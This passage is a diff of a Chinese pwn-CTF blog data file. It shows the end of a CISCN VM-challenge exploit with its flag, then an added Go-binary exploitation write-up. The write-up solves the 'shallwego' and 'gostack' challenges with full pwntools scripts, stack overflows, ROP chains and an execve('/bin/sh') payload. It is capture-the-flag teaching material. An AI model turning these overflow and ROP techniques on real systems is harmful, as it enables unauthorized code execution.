class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>flag值</strong></p>
+<p>flag{330c99dc-129a-4348-8f1c-bebfcff77b79}</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+        <tag>ciscn</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2024-2961</title>
     <url>/blog/2024/09/21/CVE-2024-2961/</url>
     <content><![CDATA[<h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
@@ -128,6 +334,218 @@
       <tags>
         <tag>pwn</tag>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gopwn初探</title>
+    <url>/blog/2024/09/22/go-pwn/</url>
+    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
+<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
+<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
+<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
+<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
+<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
+</ul>
+<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
+
+<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
+                      class=""
+                >
+
+<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
+<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
+                      class=""
+                >
+
+<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
+<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
+                      class=""
+                >
+
+<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
+                      class=""
+                >
+
+<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
+                      class=""
+                >
+
+<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
+<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
+                      class=""
+                >
+
+<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
+                      class=""
+                >
+
+<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
+                      class=""
+                >
+
+<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
+<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
+                      class=""
+                >
+
+<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
+                      class=""
+                >
+
+<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
+                      class=""
+                >
+
+<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
+
+<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
+<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
+                      class=""
+                >
+
+<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
+                      class=""
+                >
+
+<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
+                      class=""
+                >
+
+<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
+                      class=""
+                >
+
+<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
+                      class=""
+                >
+
+<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>go</tag>
+        <tag>ciscn wp</tag>
       </tags>
   </entry>
   <entry>
@@ -1534,206 +1952,109 @@
       </tags>
   </entry>
   <entry>
-    <title>gopwn初探</title>
-    <url>/blog/2024/09/22/go-pwn/</url>
-    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
-<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
-<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
-<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
-<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
-<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
-</ul>
